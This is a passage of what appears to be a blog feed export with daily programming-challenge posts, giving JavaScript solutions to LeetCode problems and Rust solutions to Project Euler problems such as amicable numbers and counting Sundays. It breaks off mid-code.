class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">553. Optimal Division</span><br><span class="line"></span><br><span class="line">Given a list of positive integers, the adjacent integers will perform the float division. For example, [2,3,4] -&gt; 2 / 3 / 4.</span><br><span class="line"></span><br><span class="line">However, you can add any number of parenthesis at any position to change the priority of operations. You should find out how to add parenthesis to get the maximum result, and return the corresponding expression in string format. Your expression should NOT contain redundant parenthesis.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">Input: [1000,100,10,2]</span><br><span class="line">Output: &quot;1000/(100/10/2)&quot;</span><br><span class="line">Explanation:</span><br><span class="line">1000/(100/10/2) = 1000/((100/10)/2) = 200</span><br><span class="line">However, the bold parenthesis in &quot;1000/((100/10)/2)&quot; are redundant, </span><br><span class="line">since they don&apos;t influence the operation priority. So you should return &quot;1000/(100/10/2)&quot;. </span><br><span class="line"></span><br><span class="line">Other cases:</span><br><span class="line">1000/(100/10)/2 = 50</span><br><span class="line">1000/(100/(10/2)) = 50</span><br><span class="line">1000/100/10/2 = 0.5</span><br><span class="line">1000/100/(10/2) = 2</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">The length of the input array is [1, 10].</span><br><span class="line">Elements in the given array will be in range [2, 1000].</span><br><span class="line">There is only one optimal division for each test case.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I first was derived into a wrong way -- DP.</p><p>But figured out that mathematical way is the best.</p><p>Check my code if you don&#39;t get it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> optimalDivision = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.length === <span class="number">1</span>) <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;nums[<span class="number">0</span>]&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">if</span> (nums.length === <span class="number">2</span>) <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;nums[<span class="number">0</span>]&#125;</span>/<span class="subst">$&#123;nums[<span class="number">1</span>]&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;nums[<span class="number">0</span>]&#125;</span>/(<span class="subst">$&#123;nums.slice(<span class="number">1</span>).join(<span class="string">'/'</span>)&#125;</span>)`</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-10 Daily Challenge</title>
      <link href="/2019-01-10-Daily-Challenge/"/>
      <url>/2019-01-10-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Amicable number</em> in <em>Rust</em> and <em>Unique Morse Code Words</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Amicable numbers</span><br><span class="line"></span><br><span class="line">Problem 21 </span><br><span class="line"></span><br><span class="line">Let d(n) be defined as the sum of proper divisors of n (numbers less than n which divide evenly into n).</span><br><span class="line">If d(a) = b and d(b) = a, where a ≠ b, then a and b are an amicable pair and each of a and b are called amicable numbers.</span><br><span class="line"></span><br><span class="line">For example, the proper divisors of 220 are 1, 2, 4, 5, 10, 11, 20, 22, 44, 55 and 110; therefore d(220) = 284. The proper divisors of 284 are 1, 2, 4, 71 and 142; so d(284) = 220.</span><br><span class="line"></span><br><span class="line">Evaluate the sum of all the amicable numbers under 10000.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>One way to do it is check the divisor in $O(\sqrt n)$ time complexity.</p><p>One way to do it is get the primal factorial of number, and do it with DFS approach. I came up with this idea and don&#39;t checked its time complexity, nor implemented it.</p><p>One way to do it is get the prima factorial of number which:</p><p>$$n=p_1^{a_1}p_2^{a_2}...p_k^{a_k}$$</p><p>Then, the sum of divisors(including itself) is </p><p>$$\prod_{i=1}^{k}(p_i^0+p_i^1+...+p_i^{a_i})$$</p><p>ref: <a href="https://mathschallenge.net/library/number/sum_of_divisors" target="_blank" rel="noopener">https://mathschallenge.net/library/number/sum_of_divisors</a></p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve = Sieve::new(<span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(sum_of_divisor(<span class="number">284</span>, &amp;sieve) == <span class="number">220</span>);</span><br><span class="line">    <span class="built_in">assert!</span>(sum_of_divisor(<span class="number">220</span>, &amp;sieve) == <span class="number">284</span>);</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="number">2</span>..<span class="number">10000</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = sum_of_divisor(num, &amp;sieve);</span><br><span class="line">        <span class="keyword">if</span> tmp &lt; <span class="number">10000</span> &amp;&amp; tmp != num &amp;&amp;sum_of_divisor(tmp, &amp;sieve) == num &#123;</span><br><span class="line">            ans += tmp + num;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    ans /= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">sum_of_divisor</span></span>(n: <span class="built_in">i32</span>, sieve: &amp;Sieve) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> factors: <span class="built_in">Vec</span>&lt;(<span class="built_in">usize</span>, <span class="built_in">usize</span>)&gt; = <span class="keyword">match</span> sieve.factor(n <span class="keyword">as</span> <span class="built_in">usize</span>) &#123;</span><br><span class="line">        <span class="literal">Ok</span>(v) =&gt; v,</span><br><span class="line">        <span class="literal">Err</span>(_) =&gt; <span class="built_in">Vec</span>::new(),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> factors &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> sum = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">0</span>..factor.<span class="number">1</span> &#123;</span><br><span class="line">            tmp *= factor.<span class="number">0</span>;</span><br><span class="line">            sum += tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        ans *= sum;</span><br><span class="line">    &#125;</span><br><span class="line">    ans <span class="keyword">as</span> <span class="built_in">i32</span> - n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">804. Unique Morse Code Words</span><br><span class="line"></span><br><span class="line">International Morse Code defines a standard encoding where each letter is mapped to a series of dots and dashes, as follows: &quot;a&quot; maps to &quot;.-&quot;, &quot;b&quot; maps to &quot;-...&quot;, &quot;c&quot; maps to &quot;-.-.&quot;, and so on.</span><br><span class="line"></span><br><span class="line">For convenience, the full table for the 26 letters of the English alphabet is given below:</span><br><span class="line"></span><br><span class="line">[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;]</span><br><span class="line">Now, given a list of words, each word can be written as a concatenation of the Morse code of each letter. For example, &quot;cba&quot; can be written as &quot;-.-..--...&quot;, (which is the concatenation &quot;-.-.&quot; + &quot;-...&quot; + &quot;.-&quot;). We&apos;ll call such a concatenation, the transformation of a word.</span><br><span class="line"></span><br><span class="line">Return the number of different transformations among all words we have.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">Input: words = [&quot;gin&quot;, &quot;zen&quot;, &quot;gig&quot;, &quot;msg&quot;]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">The transformation of each word is:</span><br><span class="line">&quot;gin&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;zen&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;gig&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line">&quot;msg&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line"></span><br><span class="line">There are 2 different transformations, &quot;--...-.&quot; and &quot;--...--.&quot;.</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">The length of words will be at most 100.</span><br><span class="line">Each words[i] will have length in range [1, 12].</span><br><span class="line">words[i] will only consist of lowercase letters.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Use map to encode, set to record.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string[]&#125; words</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> uniqueMorseRepresentations = <span class="function"><span class="keyword">function</span>(<span class="params">words</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">    [<span class="string">'a'</span>,<span class="string">'.-'</span>], [<span class="string">'b'</span>,<span class="string">'-...'</span>], [<span class="string">'c'</span>,<span class="string">'-.-.'</span>], [<span class="string">'d'</span>,<span class="string">'-..'</span>],</span><br><span class="line">    [<span class="string">'e'</span>,<span class="string">'.'</span>], [<span class="string">'f'</span>,<span class="string">'..-.'</span>], [<span class="string">'g'</span>,<span class="string">'--.'</span>], [<span class="string">'h'</span>,<span class="string">'....'</span>],</span><br><span class="line">    [<span class="string">'i'</span>,<span class="string">'..'</span>], [<span class="string">'j'</span>,<span class="string">'.---'</span>], [<span class="string">'k'</span>,<span class="string">'-.-'</span>], [<span class="string">'l'</span>,<span class="string">'.-..'</span>],</span><br><span class="line">    [<span class="string">'m'</span>,<span class="string">'--'</span>], [<span class="string">'n'</span>,<span class="string">'-.'</span>], [<span class="string">'o'</span>,<span class="string">'---'</span>], [<span class="string">'p'</span>,<span class="string">'.--.'</span>],</span><br><span class="line">    [<span class="string">'q'</span>,<span class="string">'--.-'</span>], [<span class="string">'r'</span>,<span class="string">'.-.'</span>], [<span class="string">'s'</span>,<span class="string">'...'</span>], [<span class="string">'t'</span>,<span class="string">'-'</span>],</span><br><span class="line">    [<span class="string">'u'</span>,<span class="string">'..-'</span>], [<span class="string">'v'</span>,<span class="string">'...-'</span>], [<span class="string">'w'</span>,<span class="string">'.--'</span>], [<span class="string">'x'</span>,<span class="string">'-..-'</span>],</span><br><span class="line">    [<span class="string">'y'</span>,<span class="string">'-.--'</span>], [<span class="string">'z'</span>,<span class="string">'--..'</span>]]);</span><br><span class="line">  <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> word <span class="keyword">of</span> words) &#123;</span><br><span class="line">    <span class="keyword">let</span> str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> c <span class="keyword">of</span> word) &#123;</span><br><span class="line">      str += map.get(c);</span><br><span class="line">    &#125;</span><br><span class="line">    set.add(str);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> set.size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-09 Daily Challenge</title>
      <link href="/2019-01-09-Daily-Challenge/"/>
      <url>/2019-01-09-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Factorial digit sum</em> in <em>Rust</em> and <em>Minimum Window Substring</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Factorial digit sum</span><br><span class="line"></span><br><span class="line">Problem 20 </span><br><span class="line"></span><br><span class="line">n! means n × (n − 1) × ... × 3 × 2 × 1</span><br><span class="line"></span><br><span class="line">For example, 10! = 10 × 9 × ... × 3 × 2 × 1 = 3628800,</span><br><span class="line">and the sum of the digits in the number 10! is 3 + 6 + 2 + 8 + 8 + 0 + 0 = 27.</span><br><span class="line"></span><br><span class="line">Find the sum of the digits in the number 100!</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::&#123;BigInt&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> result: BigInt = BigInt::from(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">101</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> num: BigInt = BigInt::from(i);</span><br><span class="line">        result = result * &amp;num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = result.to_str_radix(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> MINES: <span class="built_in">i32</span> = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result.chars() &#123;</span><br><span class="line">        ans += (i <span class="keyword">as</span> <span class="built_in">i32</span>) - MINES;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>,ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">76. Minimum Window Substring</span><br><span class="line"></span><br><span class="line">Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n).</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">Input: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;</span><br><span class="line">Output: &quot;BANC&quot;</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">If there is no such window in S that covers all characters in T, return the empty string &quot;&quot;.</span><br><span class="line">If there is such window, you are guaranteed that there will always be only one unique minimum window in S.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Just maintain a sliding window include all needed character.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; t</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> minWindow = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> t_map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">let</span> s_map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> i <span class="keyword">of</span> t)&#123;</span><br><span class="line">    <span class="keyword">if</span>(t_map.has(i)) t_map.set(i, t_map.get(i) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> t_map.set(i, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> lft = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> rht = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> ans = [<span class="number">-1</span>,<span class="number">-1</span>];</span><br><span class="line">  <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> min = <span class="number">1e10</span>;</span><br><span class="line">  <span class="keyword">while</span> (rht &lt; s.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> c = s.charAt(rht);</span><br><span class="line">    <span class="keyword">if</span>(t_map.has(c))&#123;</span><br><span class="line">      <span class="keyword">if</span>(s_map.has(c))&#123;</span><br><span class="line">        s_map.set(c, s_map.get(c) + <span class="number">1</span>)</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        s_map.set(c, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(s_map.get(c) == t_map.get(c))cnt += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt == t_map.size)&#123;</span><br><span class="line">      <span class="keyword">while</span>(lft &lt;= rht &amp;&amp; cnt == t_map.size)&#123;</span><br><span class="line">        <span class="keyword">let</span> cc = s.charAt(lft);</span><br><span class="line">        <span class="keyword">if</span>(rht - lft + <span class="number">1</span> &lt; min)&#123;</span><br><span class="line">          min = rht - lft + <span class="number">1</span>;</span><br><span class="line">          ans[<span class="number">0</span>] = lft;</span><br><span class="line">          ans[<span class="number">1</span>] = rht;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(t_map.has(cc)) &#123;</span><br><span class="line">          s_map.set(cc, s_map.get(cc) - <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span>(s_map.get(cc) &lt; t_map.get(cc))&#123;</span><br><span class="line">            cnt -= <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++lft;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++rht;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s.slice(ans[<span class="number">0</span>], ans[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(minWindow("ADOBECODEBANC","ABC"));</span></span><br><span class="line"><span class="comment">// console.log(minWindow("AA","AA"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-08 Daily Challenge</title>
      <link href="/2019-01-08-Daily-Challenge/"/>
      <url>/2019-01-08-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Counting Sundays</em> in <em>Rust</em> and <em>N-Queens II</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Counting Sundays</span><br><span class="line"></span><br><span class="line">Problem 19 </span><br><span class="line"></span><br><span class="line">You are given the following information, but you may prefer to do some research for yourself.</span><br><span class="line"></span><br><span class="line">- 1 Jan 1900 was a Monday.</span><br><span class="line">- Thirty days has September,</span><br><span class="line">  April, June and November.</span><br><span class="line">  All the rest have thirty-one,</span><br><span class="line">  Saving February alone,</span><br><span class="line">  Which has twenty-eight, rain or shine.</span><br><span class="line">  And on leap years, twenty-nine.</span><br><span class="line">- A leap year occurs on any year evenly divisible by 4, but not on a century unless it is divisible by 400.</span><br><span class="line"></span><br><span class="line">How many Sundays fell on the first of the month during the twentieth century (1 Jan 1901 to 31 Dec 2000)?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Simple simulation.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">assert!</span>(is_leap_year(<span class="number">2016</span>));</span><br><span class="line">    <span class="built_in">assert!</span>(is_leap_year(<span class="number">1997</span>) == <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">let</span> days = [<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> day = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> year <span class="keyword">in</span> <span class="number">1901</span>..<span class="number">2001</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> month <span class="keyword">in</span> <span 